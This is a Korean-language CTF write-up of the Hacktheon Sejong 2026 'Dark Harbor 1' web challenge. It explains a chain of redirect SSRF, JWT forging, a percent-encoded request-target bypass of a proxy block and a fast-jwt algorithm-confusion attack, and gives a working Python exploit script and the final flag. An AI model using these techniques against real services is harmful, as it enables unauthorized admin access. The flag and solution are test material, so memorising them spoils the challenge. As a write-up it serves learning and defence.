---
title: "Hacktheon Sejong 2026 Quals Dark Harbor 1 Writeup"
published: 2026-04-28
description: "Hacktheon Sejong 2026 Quals Dark Harbor 1 문제 풀이."
category: "CTF/Wargame"
tags: ["Hacktheon Sejong", "CTF", "Writeup", "Web"]
draft: false
listed: false
---

# Dark Harbor 1

목표는 api-server가 생성하는 internal admin console이었다.
여기에는 플래그와 Phase 2에서 쓰는 `deployment_hmac_secret`이 들어 있었다.

첫 단계는 `/build/fetch-artifact`의 redirect SSRF였다.
처음 URL만 검사하고 redirect 이후 목적지는 다시 보지 않았다.
공개 redirector를 거쳐 `api-server:6000/config`를 읽으면 내부 routing 정보와 `HMAC_SECRET`이 나온다.

이 secret으로 api-server local JWT key를 만들었다.

```text
LOCAL_JWT_KEY = HMAC-SHA256(HMAC_SECRET, "darkharbor-local-jwt").hexdigest()
```

이 key로 `role=pipeline_admin`, `iss=darkharbor-local` 토큰을 만들면 pipeline admin API를 사용할 수 있다.

그다음은 policy seed다.
public key PEM을 JUnit report의 첫 번째 failure output에 넣어 업로드하면, policy engine이 그 PEM을 JWKS entry로 가져간다.

`/internal/policy-seed`는 edge proxy에서 막히지만, absolute-form request target과 percent-encoding을 섞으면 우회할 수 있다.

```text
request target = http://api-server/%69nternal/policy-seed
```

edge proxy는 이를 `/internal`로 보지 못하고, Fastify는 decode 후 `/internal/policy-seed` route로 처리한다.

마지막은 `fast-jwt` 검증 차이다.
policy engine은 seed된 PEM 앞에 audit banner로 개행을 붙인다.

```text
key = "\n" + public_key_pem
```

이 값은 RSA public key로 인식되지 않고 HS256 secret처럼 쓰였다.
그래서 같은 값을 HMAC key로 사용해 `role=admin` policy token을 만들었다.

이 token으로 같은 request-target 우회를 써서 `/internal/admin-console.json`을 읽었다.

익스플로잇 코드

```python
import base64
import hashlib
import hmac
import json
import subprocess
import time
from pathlib import Path

import requests

BASE = "http://15.164.173.78:8080"
WORKSPACE_ID = 559
WORKSPACE_TOKEN = "<workspace_token>"
HMAC_SECRET = "a]Kx9#mP$vQ2nR7wF4jL8cB5hT0yU3eA"
KID = "axii-kid-559"

def b64url(data: bytes) -> str:
    return base64.urlsafe_b64encode(data).rstrip(b"=").decode()

def hs256(secret: bytes, header: dict, payload: dict) -> str:
    signing_input = (
        b64url(json.dumps(header, separators=(",", ":")).encode())
        + "."
        + b64url(json.dumps(payload, separators=(",", ":")).encode())
    )
    sig = b64url(hmac.new(secret, signing_input.encode(), hashlib.sha256).digest())
    return signing_input + "." + sig

subprocess.run(["openssl", "genrsa", "-out", "/tmp/dh_rsa.pem", "2048"], check=True)
subprocess.run(["openssl", "rsa", "-in", "/tmp/dh_rsa.pem", "-pubout", "-out", "/tmp/dh_rsa_pub.pem"], check=True)
pub = Path("/tmp/dh_rsa_pub.pem").read_text()

xml = (
    '<?xml version="1.0"?>'
    '<testsuite name="seed"><testcase name="pem">'
    '<failure><![CDATA[' + pub + ']]></failure>'
    '</testcase></testsuite>'
)
r = requests.post(
    f"{BASE}/api/builds/{WORKSPACE_ID}/test-report",
    headers={
        "Authorization": f"Bearer {WORKSPACE_TOKEN}",
        "Content-Type": "application/xml",
    },
    data=xml,
)
r.raise_for_status()
report_id = r.json()["report_id"]

r = requests.post(
    BASE + "/",
    headers={
        "Authorization": f"Bearer {WORKSPACE_TOKEN}",
        "Content-Type": "application/json",
    },
    data=json.dumps({
        "workspace_id": WORKSPACE_ID,
        "report_id": report_id,
        "kid": KID,
    }),
)

now = int(time.time())
policy_token = hs256(
    ("\n" + pub).encode(),
    {"alg": "HS256", "typ": "JWT", "kid": KID},
    {"sub": "axii", "role": "admin", "iat": now, "exp": now + 600},
)

print("Use curl:")
print(
    "curl --request-target 'http://api-server/%69nternal/admin-console.json' "
    f"'{BASE}/' -H 'X-Policy-Token: {policy_token}'"
)
```

플래그: `hacktheon2026{sil3nt_tid3_bre4ch}`
